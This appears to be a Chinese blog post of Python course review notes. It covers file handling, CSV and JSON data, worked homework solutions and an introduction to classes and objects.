<h3 id="文件的逐行操作"><a href="#文件的逐行操作" class="headerlink" title="文件的逐行操作"></a>文件的逐行操作</h3><p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20117.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20118.png" alt="image.png"></p>
<h2 id="数据的文件写入"><a href="#数据的文件写入" class="headerlink" title="数据的文件写入"></a>数据的文件写入</h2><p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20119.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20120.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20121.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20122.png" alt="image.png"></p>
<h2 id="数据组织的维度"><a href="#数据组织的维度" class="headerlink" title="数据组织的维度"></a>数据组织的维度</h2><p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20123.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20124.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20125.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20126.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20127.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20128.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20129.png" alt="image.png"></p>
<h3 id="一维数据"><a href="#一维数据" class="headerlink" title="一维数据"></a>一维数据</h3><p>（1）表示</p>
<p><strong>a.如果数据间有序：使用列表类型</strong></p>
<p>ls &#x3D; [3.1398, 3.1349, 3.1376]</p>
<p>列表类型可以表达一维有序数据、for循环可以遍历数据，进而对每个数据进行处理</p>
<p><strong>b.如果数据间无序：使用集合类型</strong></p>
<p>st &#x3D; {3.1398, 3.1349, 3.1376}</p>
<p>集合类型可以表达一维无序数据、for循环可以遍历数据，进而对每个数据进行处理</p>
<p>（2）存储</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/0a195085-2f56-4e66-b037-25fbb6845232.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20130.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/13a15e76-2af4-4b7c-8c32-82a73e555977.png" alt="image.png"></p>
<p>（3）处理</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20131.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/7ff8040d-e7d9-43b2-b184-4e0c0617364a.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/17cac020-0659-4240-b7e9-d20bec921918.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/14707bfe-f56f-48b9-840a-352ed4b3b743.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/0e5ba5fd-a334-4968-a24e-dc1703053afe.png" alt="image.png"></p>
<h3 id="二维数据"><a href="#二维数据" class="headerlink" title="二维数据"></a>二维数据</h3><p>（1）表示</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20132.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20133.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20134.png" alt="image.png"></p>
<p>（2）CSV格式与二维数据存储</p>
<p>国际通用的一二维数据存储格式，一般.csv扩展名。每行一个一维数据，采用逗号分隔，无空行。Excel和一般编辑软件都可以读入或另存为csv文件。</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20135.png" alt="image.png"></p>
<p>如果某个元素缺失，逗号仍要保留。二维数据的表头可以作为数据存储，也可以另行存储。逗号为英文半角逗号，逗号与数据之间无额外空格。</p>
<p><strong>按行存？按列存？</strong></p>
<p>按行存或者按列存都可以，具体由程序决定。一般索引习惯：ls[row][column]，先行后列。根据一般习惯，外层列表每个元素是一行，按行存。</p>
<p>（3）处理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从CSV格式的文件中读入数据</span></span><br><span class="line">fo = <span class="built_in">open</span>(fname)</span><br><span class="line">ls = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fo:</span><br><span class="line">    line = line.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    ls.append(line.split(<span class="string">&quot;,&quot;</span>)) fo.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将数据写入CSV格式的文件</span></span><br><span class="line">ls = [[], [], []] <span class="comment">#二维列表</span></span><br><span class="line">f = <span class="built_in">open</span>(fname, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> ls:</span><br><span class="line">    f.write(<span class="string">&#x27;,&#x27;</span>.join(item) + <span class="string">&#x27;\n&#x27;</span>) f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 采用二层循环</span></span><br><span class="line">ls = [[<span class="number">1</span>,<span class="number">2</span>], [<span class="number">3</span>,<span class="number">4</span>], [<span class="number">5</span>,<span class="number">6</span>]] <span class="comment">#二维列表</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> ls:</span><br><span class="line">    <span class="keyword">for</span> column <span class="keyword">in</span> row:</span><br><span class="line">         <span class="built_in">print</span>(column)</span><br></pre></td></tr></table></figure>

<p>CSV格式的HTML展示</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20136.png" alt="image.png"></p>
<h2 id="高维数据的格式化"><a href="#高维数据的格式化" class="headerlink" title="高维数据的格式化"></a>高维数据的格式化</h2><p>与一维二维数据不同，高维数据能展示数据间更为复杂的组织关系。为了保持灵活性，表示高维数据不采用任何结构形式，仅采用最基本的二元关系，即键值对。<br>JSON格式可以对高维数据进行表达和存储。JSON（JavaScript Object Notation）是一种轻量级的数据交换格式，易于阅读和理解。JSON格式表达键值对&lt;key, value&gt;的基本格式如下，键值对都保存在双引号中：”key” : “value”</p>
<p>当多个键值对放在一起时，JSON有如下一些约定：数据保存在键值对中；键值对之间由逗号分隔；大括号用于保存键值对数据组成的对象；方括号用于保存键值对数据组成的数组。</p>
<p><strong>Json里的对象——&gt;Python里的字典、Json里的数组——&gt;Python里的列表</strong></p>
<h2 id="json库的使用"><a href="#json库的使用" class="headerlink" title="json库的使用"></a>json库的使用</h2><p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20137.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;dt = &#123;<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>:<span class="number">6</span>&#125;</span><br><span class="line">&gt;&gt;&gt;s1 = json.dumps(dt)  <span class="comment">#dumps返回JSON格式的字符串类型</span></span><br><span class="line">&gt;&gt;&gt;s2 = json.dumps(dt,sort_keys=<span class="literal">True</span>,indent=<span class="number">4</span>)</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span>(s1)</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">4</span>, <span class="string">&quot;a&quot;</span>: <span class="number">6</span>, <span class="string">&quot;b&quot;</span>: <span class="number">2</span>&#125;</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span>(s2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: <span class="number">6</span>,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">&quot;c&quot;</span>: <span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span>(s1==s2)</span><br><span class="line"><span class="literal">False</span></span><br><span class="line">&gt;&gt;&gt;dt2 = json.loads(s2)</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span>(dt2, <span class="built_in">type</span>(dt2))</span><br><span class="line">&#123;<span class="string">&#x27;c&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;a&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>&#125; &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Python数据分析"><a href="#Python数据分析" class="headerlink" title="Python数据分析"></a>Python数据分析</h2><p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20138.png" alt="image.png"></p>
<p>读取数据并可视化、异常数据检测、数据预测KNN</p>
<h1 id="Python第四次作业"><a href="#Python第四次作业" class="headerlink" title="Python第四次作业"></a>Python第四次作业</h1><p><strong>1.文件关键行数</strong></p>
<p>关键行指一个文件中包含的不重复行。关键行数指一个文件中包含的不重复行的数量。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬统计附件文件中与关键行的数量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;latex.log&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    rows_set = <span class="built_in">set</span>(f.readlines())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;共&#123;&#125;关键行&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(rows_set)))</span><br></pre></td></tr></table></figure>

<p><strong>2.字典翻转输出</strong></p>
<p>读入一个字典类型的字符串，反转其中键值对输出。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬即读入字典key:value模式，输出value:key模式。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>用户输入的字典格式的字符串，如果输入不正确，提示：输入错误。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>给定字典d，按照print(d)方式输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d=<span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">type</span>(d)!=<span class="built_in">dict</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;输入错误&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    c=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> d:</span><br><span class="line">        c[d[k]]=k</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>

<p><strong>3.模拟决赛现场最终成绩的计算</strong>‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>【功能要求】编写程序，模拟决赛现场最终成绩的计算过程。首先输入评委人数，要求判断评委不得少于5人；然后依次输入评委的成绩，成绩范围应在[0,100]。在所有评委的分数中，去掉一个最高分、去掉一个最低分，剩余成绩求算术平均分，作为选手的最终成绩。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入评委人数：&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> n&lt;<span class="number">5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;评委人数太少，必须至少五个人&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">scores=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            score=<span class="built_in">input</span>(<span class="string">&quot;请输入第&#123;0&#125;个评委的分数&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>))</span><br><span class="line">            score=<span class="built_in">float</span>(score)</span><br><span class="line">            <span class="keyword">assert</span> <span class="number">0</span>&lt;=score&lt;=<span class="number">100</span></span><br><span class="line">            scores.append(score)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;分数错误&quot;</span>)</span><br><span class="line">highest=<span class="built_in">max</span>(scores)</span><br><span class="line">lowest=<span class="built_in">min</span>(scores)</span><br><span class="line">scores.remove(highest)</span><br><span class="line">scores.remove(lowest)</span><br><span class="line">final=<span class="built_in">round</span>(<span class="built_in">sum</span>(scores)/<span class="built_in">len</span>(scores),<span class="number">2</span>)</span><br><span class="line">formatter=<span class="string">&#x27;去掉一个最高分&#123;0&#125;去掉一个最低分&#123;1&#125;最终得分是&#123;2&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(formatter.<span class="built_in">format</span>(highest,lowest,final))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可扩展多位选手成绩的数据可视化</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment"># 设置中文字体显示</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;Microsoft YaHei&#x27;</span>]</span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"><span class="comment"># 生成随机数据</span></span><br><span class="line">x = np.arange(<span class="number">1</span>, n+<span class="number">1</span>)</span><br><span class="line">y = np.random.randint(<span class="number">60</span>, <span class="number">100</span>, size=n)</span><br><span class="line"><span class="comment"># 绘制柱状图</span></span><br><span class="line">plt.bar(x, y)</span><br><span class="line"><span class="comment"># 添加标题和标签</span></span><br><span class="line">plt.title(<span class="string">&#x27;选手成绩&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;选手&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;分数&#x27;</span>)</span><br><span class="line"><span class="comment"># 显示图形</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><strong>4.jieba库分词</strong></p>
<p>‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪txt表示一段中文文本，请补充代码，输出该文本所有可能的分词结果。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line">txt = <span class="string">&quot;中华人民共和国教育部考试中心委托专家制定了全国计算机等级考试二级程序设计考试大纲&quot;</span></span><br><span class="line">ls = jieba.lcut(txt,cut_all=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(ls)</span><br></pre></td></tr></table></figure>

<p><strong>5.CSV格式数据清洗</strong></p>
<p>附件是一个CSV文件，其中每个数据前后存在空格，请对其进行清洗，要求如下：‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬去掉每个数据前后空格，即数据之间仅用逗号 (,) 分割；清洗后打印输出。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.csv&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        line = line.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(line,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="面向对象程序设计"><a href="#面向对象程序设计" class="headerlink" title="面向对象程序设计"></a>面向对象程序设计</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    name = <span class="string">&#x27;unknown&#x27;</span></span><br><span class="line">    age = <span class="number">0</span></span><br><span class="line">    jiguan = <span class="string">&#x27;unknown&#x27;</span></span><br><span class="line"></span><br><span class="line">p1= Person()</span><br><span class="line">p2= Person()</span><br><span class="line"><span class="built_in">print</span>(p1.name)</span><br><span class="line"></span><br><span class="line">p1.name = <span class="string">&#x27;wangdachui&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(p1.name)</span><br><span class="line"><span class="built_in">print</span>(p2.name)</span><br><span class="line"></span><br><span class="line">p2.aihao = <span class="string">&#x27;zhoujielun&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(p2.aihao)</span><br><span class="line"><span class="built_in">print</span>(p1.aihao)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p1.age)</span><br><span class="line"><span class="built_in">print</span>(p2.age)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(p1.age),<span class="built_in">id</span>(p2.age))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    name=<span class="string">&#x27;Unknown&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">SetName</span>(<span class="params">self,newname</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name=newname</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">PrintName</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;姓名:%s&#x27;</span>%<span class="variable language_">self</span>.name)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    stu1=Student()</span><br><span class="line">    stu2=Student()</span><br><span class="line">    stu1.SetName(<span class="string">&#x27;zhangsan&#x27;</span>)</span><br><span class="line">    stu2.SetName(<span class="string">&#x27;lisi&#x27;</span>)</span><br><span class="line">    stu1.PrintName()</span><br><span class="line">    stu2.PrintName()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(stu1.name)</span><br><span class="line"><span class="built_in">print</span>(stu2.name)</span><br><span class="line">stu3 = Student()</span><br><span class="line"><span class="built_in">print</span>(stu3.name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Setinfo</span>(<span class="params">self, newname, newid</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = newname</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">id</span> = newid</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">PrintInfo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>.name, <span class="variable language_">self</span>.<span class="built_in">id</span>)</span><br><span class="line">stu = Student()</span><br><span class="line">stu.Setinfo(<span class="string">&#x27;王大锤&#x27;</span>,<span class="string">&#x27;1231231234567&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stu.PrintInfo()</span><br><span class="line"><span class="built_in">print</span>(stu.<span class="built_in">id</span>)</span><br><span class="line"><span class="built_in">print</span>(stu.__<span class="built_in">id</span>)</span><br></pre></td></tr></table></figure>

<h2 id="面向对象概述"><a href="#面向对象概述" class="headerlink" title="面向对象概述"></a>面向对象概述</h2><p>面向对象是当前流行的程序设计方法，其以人类习惯的思维方式，用对象来理解和分析问题空间，使开发软件的方法与过程尽可能接近人类认识世界、解决问题的思维方法与过程。</p>
<p>面向对象方法的基本观点是一切系统都是由对象构成的，每个对象都可以接收并处理其他对象发送的消息，它们的相互作用、相互影响，实现了整个系统的运转。</p>
<p><strong>类和对象的概念：</strong>类和对象是面向对象程序设计的两个重要概念。</p>
<p>类和对象的关系即数据类型与变量的关系，根据一个类可以创建多个对象，而每个对象只能是某一个类的对象。</p>
<p>类规定了可以用于存储什么数据，而对象用于实际存储数据，每个对象可存储不同的数据。</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20139.png" alt="image.png"></p>
<h2 id="类的定义和创建实例"><a href="#类的定义和创建实例" class="headerlink" title="类的定义和创建实例"></a>类的定义和创建实例</h2><p>类的定义：</p>
<p>在一个类中，除了可以包含前面所说的属性，还可以包含各种方法。属性对应一个类可以用来保存哪些数据，而方法对应一个类可以支持哪些操作（即数据处理）。</p>
<p>类的定义形式多样：</p>
<p>我们既可以直接创建新的类，也可以基于一个或多个已有的类创建新的类；我们既可以创建一个空的类，然后再动态添加属性和方法，也可以在创建类的同时设置属性和方法。</p>
<p>封装性：</p>
